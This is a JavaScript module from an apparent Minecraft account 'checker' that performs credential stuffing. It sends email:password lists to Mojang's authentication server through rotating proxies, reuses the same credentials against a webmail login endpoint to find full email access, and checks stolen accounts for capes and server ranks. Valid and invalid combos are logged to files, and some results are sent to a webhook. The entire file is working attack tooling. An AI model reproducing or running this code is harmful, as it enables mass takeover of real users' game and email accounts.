const request = require("request")
const superagent = require('superagent');
const fetch = require("node-fetch");
const chalk = require("chalk");
const dnsPromises = require('dns').promises;
var HttpsProxyAgent = require('https-proxy-agent');
var ProxyAgent = require('proxy-agent');
const axios = require('axios-https-proxy-fix');
const funcraft = require('funcraft');
const fs = require('fs');
const async = require("async");
const {
    EventEmitter
} = require("events");

let s = require("../index.js")

function createUUID(trimmedUUID) {
    return trimmedUUID.substr(0, 8) + '-' + trimmedUUID.substr(8, 4) + '-' + trimmedUUID.substr(12, 4) + '-' + trimmedUUID.substr(16, 4) + '-' + trimmedUUID.substr(20);
}

module.exports.throwBadMojang = async (options) => {
    if (s.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("BAD")}] ${options.mail}:${options.password}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)

    fs.appendFile('./results/bad.txt', `${options.mail}:${options.password}\n`, async () => {})
    s.def.bad.mc++
    if (s.def.webhookClient) s.def.webhookClient.send(`[${new Date().toLocaleTimeString("fr-FR")}] [BAD] ${options.mail}:${options.password}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)
}

module.exports.throwBadMFA = async (options) => {
    if (s.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("BAD-MFA")}] ${options.mail}:${options.password}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)

    fs.appendFile(`./results/mfa/bad.txt`, `${options.mail}:${options.password}\n`, async () => {})
    s.def.bad.mfa++
    if (s.def.webhookClient) s.def.webhookClient.send(`[${new Date().toLocaleTimeString("fr-FR")}] [BAD-MFA] ${options.mail}:${options.password}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)
}

module.exports.throwBadFC = async (options) => {
    if (options.neverConnected)
        if (s.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("BAD-FC")}] ${options.mail}:${options.password} Username: ${options.username}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""} | Never Connected`)
    if (options.rank)
        if (s.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("BAD-FC")}] ${options.mail}:${options.password} Username: ${options.username}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""} | Rank: Default`)
    s.def.bad.funcraft++

    if (s.def.webhookClient && options.neverConnected) s.def.webhookClient.send(`[${new Date().toLocaleTimeString("fr-FR")}] [BAD-FC] ${options.mail}:${options.password} Username: ${options.username}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""} | Never Connected`)
    if (s.def.webhookClient && options.rank) s.def.webhookClient.send(`[${new Date().toLocaleTimeString("fr-FR")}] [BAD-FC] ${options.mail}:${options.password} Username: ${options.username}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""} | Rank: Default`)
}

module.exports.throwBadOF = async (options) => {
    if (s.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("BAD-OF")}] ${options.mail}:${options.password} Username: ${options.username}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)

    fs.appendFile('./results/optifine/bad.txt', `${options.mail}:${options.password}\n`, async () => {})

    s.def.bad.optifine++

    if (s.def.webhookClient) s.def.webhookClient.send(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("BAD-OF")}] ${options.mail}:${options.password} Username: ${options.username}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)

}

module.exports.throwHitMojang = async (options) => {
    if (s.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.green(`HIT-${options.type}`)}] ${options.mail}:${options.password} Username: ${options.username}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)

    fs.appendFile(`./results/hit.txt`, `${options.mail}:${options.password}\n`, async () => {})

    s.def.hit[options.type.toLowerCase()]++
}

module.exports.throwHitFC = async (options) => {
    if (s.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.green("HIT-FC")}] ${options.mail}:${options.password} Username: ${options.username}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""} | Rank: ${options.rank}`)

    fs.appendFile(`./results/funcraft/hit.txt`, `${options.mail}:${options.password}\n`, async () => {})

    s.def.hit.funcraft++
}

module.exports.throwHitMFA = async (options) => {
    if (s.def.overviewmode)
        if (options.mail.toLowerCase().includes("gmail")) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("HIT-MFA")}] Type: GMail ${options.mail}:${options.password}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)
    if (s.def.overviewmode)
        if (options.mail.toLowerCase().includes("ymail" || "yahoo")) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("HIT-MFA")}] Type: Yahoo ${options.mail}:${options.password}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)
    if (s.def.overviewmode)
        if (options.mail.toLowerCase().includes("live" || "hotmail" || "outlook")) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("HIT-MFA")}] Type: Microsoft ${options.mail}:${options.password}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)

    fs.appendFile(`./results/mfa/${options.mail.split("@")[0].split(".")[0]}.txt`, `${options.mail}:${options.password}\n`, async () => {})

    s.def.hit.mfa++
}

module.exports.throwHitOF = async (options) => {
    if (s.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.green("HIT-OF")}] ${options.mail}:${options.password} Username: ${options.username}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""} | Optifine Cape Link: ${options.link}`)

    fs.appendFile(`./results/optifine/hit.txt`, `${options.mail}:${options.password}\n`, async () => {})
    s.def.hit.optifine++
}

module.exports.checkConfig = async (options) => {
    return new Promise((resolve, reject) => {
        request("https://raw.githubusercontent.com/D0wzy/TaurineChecker/master/config.default.json", async (error, response, body) => {
            resolve(body)
            //console.log(bod)
        })
    })
}

module.exports.checkUpdate = async (options) => {
    return new Promise((resolve, reject) => {
        request("https://raw.githubusercontent.com/D0wzy/TaurineChecker/master/version.txt", async (error, response, body) => {
            resolve(Number(body))
            //console.log(bod)
        })
    })
}

module.exports.checkMFA = async (options) => {
    let r = new Promise(async (resolve, reject) => {
        request(`https://aj-https.my.com/cgi-bin/auth?ajax_call=1&mmp=mail&simple=1&Login=${options.mail}&Password=${options.password}`, async (error, response, body) => {
            if (response.statusCode !== 200) resolve(false)
            if (body == "Ok=0") resolve(false)
            if (body == "Ok=1") resolve(true)
        })
    })
    return r
}

module.exports.checkOptifine = async (options) => {
    let r = new Promise(async (resolve, reject) => {
        request(`http://s.optifine.net/capes/${options.username}.png`, async (error, response, body) => {
            if (body.includes("Not found")) {
                resolve(false)
            } else {
                resolve(true)
            }
        })
    })
    return r
}

module.exports.checkMinecon = async (options) => {
    let r = new Promise(async (resolve, reject) => {
        request(`https://crafatar.com/capes/${options.uuid}`, async (error, response, body) => {
            if (Number(response.statusCode) === 404) {
                resolve(false)
            } else {
                resolve(true)
            }
        })
    })
    return r
}

module.exports.checkFuncraft = async (options) => {
    let r = new Promise(async (resolve, reject) => {
        funcraft.fetchPlayer(options.username).then((player) => {
            resolve({
                rank: player.grade === "Joueur" ? "Joueur" : (player.grade === "Mini-VIP" ? "Mini-VIP" : (player.grade === "VIP" ? "VIP" : (player.grade === "VIP+" ? "VIP+" : (player.grade === "Héros" ? "Héros" : (player.grade === "SuperModo" ? "SuperModo" : (player.grade === "Modo" ? "Modo" : (player.grade === "Admin" ? "Admin" : (player.grade === "Youtuber" ? "Youtuber" : (player.grade === "Helper" ? "Helper" : (player.grade === "Graphiste" ? "Graphiste" : (player.grade === "Builder" ? "Builder" : `Custom rank`))))))))))),
                banned: player.banned,
                neverConnected: false
            })
        }).catch(async (err) => {
            resolve({
                neverConnected: true
            })
        })
    })
    return r
}

module.exports.checkMojang = (options) => {
    //console.log(options)
    let startRequest = (config) => {
        let payload = {
            'agent': {
                'name': 'Minecraft',
                'version': 1
            },
            'username': options.mail,
            'password': options.password,
            'requestUser': true
        }

        if (config.useProxy) {
            let r = new Promise((resolve, reject) => {
                const config = require("../config.json")
                request({
                    'url': 'https://authserver.mojang.com/authenticate',
                    'method': "POST",
                    'proxy': `http://${options.proxy.ip}:${options.proxy.port}`,
                    headers: {
                        "Content-Type": "application/json",
                        'Pragma': 'no-cache',
                        'User-Agent': config.UserAgent
                    },
                    body: JSON.stringify(payload)
                }, async (error, response, body) => {

                    if (error) return startRequest({
                        useProxy: false
                    })
                    if (body.toLowerCase().includes("<h1>")) return startRequest({
                        useProxy: false
                    })
                    if (!body) return startRequest({
                        useProxy: false
                    })

                    body = JSON.parse(body)

                    if (body.errorMessage && body.errorMessage.includes("Invalid credentials")) {
                        return resolve(false)
                    }

                    request({
                        url: 'https://api.mojang.com/user/security/challenges',
                        method: 'GET',
                        headers: {
                            "Content-Type": "application/json",
                            'Pragma': 'no-cache',
                            'User-Agent': config.UserAgent,
                            "Authorization": `Bearer ${body.accessToken}`
                        }
                    }, async (error, response, bbody) => {

                        if (bbody.includes("question") && bbody.includes("answer")) {
                            resolve({
                                type: 'NFA',
                                mail: options.mail,
                                uuid: createUUID(body.selectedProfile.id),
                                username: body.selectedProfile.name,
                                password: options.password,
                                id: body.user.id
                            })
                        } else {
                            resolve({
                                type: 'FA',
                                mail: options.mail,
                                uuid: createUUID(body.selectedProfile.id),
                                username: body.selectedProfile.name,
                                password: options.password,
                                id: body.user.id
                            })
                        }
                    })
                })
            })
            return r
        } else {
            let r = new Promise((resolve, reject) => {
                const config = require("../config.json")
                request({
                    'url': 'https://authserver.mojang.com/authenticate',
                    'method': "POST",
                    //'proxy':`http://${options.proxy.ip}:${options.proxy.port}`,
                    headers: {
                        "Content-Type": "application/json",
                        'Pragma': 'no-cache',
                        'User-Agent': config.UserAgent
                    },
                    body: JSON.stringify(payload)
                }, async (error, response, body) => {

                    if (error) return startRequest({
                        useProxy: false
                    })
                    if (body.toLowerCase().includes("<h1>")) return startRequest({
                        useProxy: false
                    })
                    if (!body) return startRequest({
                        useProxy: false
                    })

                    body = JSON.parse(body)

                    if (body.errorMessage && body.errorMessage.includes("Invalid credentials")) {
                        return resolve(false)
                    }

                    request({
                        url: 'https://api.mojang.com/user/security/challenges',
                        method: 'GET',
                        headers: {
                            "Content-Type": "application/json",
                            'Pragma': 'no-cache',
                            'User-Agent': config.UserAgent,
                            "Authorization": `Bearer ${body.accessToken}`
                        }
                    }, async (error, response, bbody) => {

                        if (bbody.includes("question") && bbody.includes("answer")) {
                            resolve({
                                type: 'NFA',
                                mail: options.mail,
                                username: body.selectedProfile.name,
                                password: options.password,
                                id: body.user.id
                            })
                        } else {
                            resolve({
                                type: 'FA',
                                mail: options.mail,
                                username: body.selectedProfile.name,
                                password: options.password,
                                id: body.user.id
                            })
                        }
                    })
                })
            })
            return r
        }
    }
    if (options.useProxy) return startRequest({
        useProxy: true
    })
    if (!options.useProxy) return startRequest({
        useProxy: false
    })
}